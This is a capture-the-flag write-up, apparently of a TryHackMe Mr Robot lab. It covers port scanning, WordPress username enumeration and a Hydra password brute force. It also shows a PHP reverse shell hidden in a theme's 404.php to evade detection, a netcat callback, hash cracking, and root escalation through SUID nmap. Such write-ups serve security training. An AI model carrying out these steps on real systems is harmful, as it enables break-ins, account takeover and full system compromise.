## 1.Nmap Enumeration
I started by performing a comprehensive Nmap scan to identify open ports and services running on the target machine.
**Command**
```bash
nmap -p- -sC -sV -sS -oN nmapresults.txt <TARGET_IP>
```
**Scan Results**
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```
1)The fact that the Apache web server is active indicates that the main attack surface is web-based.

2)Having SSH enabled could be used to infiltrate the system if I could later obtain the username/password or private key.

## 2.Web Discovery
After the Nmap scan, I navigated to the web server's IP address. I checked the robots.txt file, which is a common place to find hidden directories or files.
```bash
URL:http://<Target-IP>/robots.txt
```
**Findings**
```bash
robots.txt file revealed two interesting entries
1)fsocity.dic
2)key-1-of-3.txt
##FLAG#1
I accessed http://<TARGET_IP>/key-1-of-3.txt and successfully retrieved the first flag.
07***********************9
```
**fsocity.dic**

I used the following commands to download and clean the list by removing duplicates

```bash
curl http://<TARGET_IP>/fsocity.dic -o fsocity.dic
sort -u fsocity.dic > fsocity_clean.dic
```

## 3.Directory Brute-Forcing
To find hidden directories and files that were not listed in robots.txt, I performed a directory brute-force attack using GoBuster
**Command**
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/robots
/wp-login    *Indicates a WordPress installation*
/admin (status:301)  *A potential entry point for administrative access*
/license
```

## 4.Wordpress Login
I discovered that the WordPress login page is vulnerable to **username enumeration** due to verbose error messages

1)**"Invalid username"** == The user does not exist

2)**"The password you entered for "username" is incorrect"** -> The username is valid.

**Result:** By testing common names like 'admin', I confirmed that **'elliot'** is a valid user on the system.
After finding the username, I will try to log in using Hydra and the `dic` file we found in the robots.txt file.

## 5.HYDRA
**Command**
```bash
hydra -l elliot -P fsocity_clean.dic 10.113.185.61 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username|incorrect"
username:elliot password:ER**-***2
```

### 6.Weaponizing the Reverse Shell
I located the default PHP reverse shell script at `/usr/share/webshells/php/php-reverse-shell.php` at tryhackme attackbox.
**Configuration:**
I modified the script to point back to my internal IP on port `4444`
**Why 404.php?**
Using the WordPress Theme Editor to overwrite `404.php` is a stealthy way to gain execution. 
Instead of creating a new file that could be easily spotted by security plugins, 
I modified an existing template that can be triggered by requesting a non-existent page or accessing the file directly in the `themes` directory.
After triggering the `404.php` file, my Netcat listener captured the reverse shell.

**Netcat Listener:**
```bash
root@ip-10-114-79-16:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.114.154.201 58920
$ whoami
daemon
$ cd /home
$ ls
robot
ubuntu
$ cd robot
$ ls
key-2-of-3.txt **we can't read**
password.raw-md5 ** use cat password.raw-md5 and use crackstation**      robot:c3f******************3b
```

After that switch robot and read key-2-of-3.txt. **FLAG 2** 82**********************9

## 7.Privilege Escalation (Root)

After becoming the robot user, I needed to escalate my privileges to root. I started by searching for binaries with the **SUID bit** set.
**Command**
```bash
$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap !!! After identifying that nmap has the SUID bit set,
I exploited its Interactive mode to escalate my privileges to root
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! https://gtfobins.org/gtfobins/nmap/
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

$ nmap --interactive
nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
root@ip-10-114-154-201:~# whoami
whoami
root
root@ip-10-114-154-201:/home# cd /root
cd /root
root@ip-10-114-154-201:/root# ls
ls
firstboot_done	key-3-of-3.txt
root@ip-10-114-154-201:/root# cat key-3-of-3.txt
cat key-3-of-3.txt ***FLAG 3***
0478*************************4
```

























